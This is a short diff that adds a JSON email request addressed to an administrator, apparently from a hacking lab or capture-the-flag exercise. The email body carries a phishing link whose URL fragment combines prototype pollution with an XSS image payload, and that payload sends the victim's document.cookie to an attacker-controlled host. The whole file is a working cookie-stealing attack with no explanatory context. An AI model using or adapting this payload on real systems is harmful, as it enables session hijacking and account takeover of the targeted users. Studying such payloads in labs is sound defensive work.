@@ -1,0 +1,7 @@
+{
+    "to": "admin@hacksmarter.local",
+    "subject": "Check this alert",
+    "body": "<a href='http://10.1.141.30:3000/dashboard#__proto__.renderCallback=<img src=x onerror=this.src=\"http://10.200.51.189:8000/?c=\"+document.cookie>'>Click here</a>"
+  }
+
+  
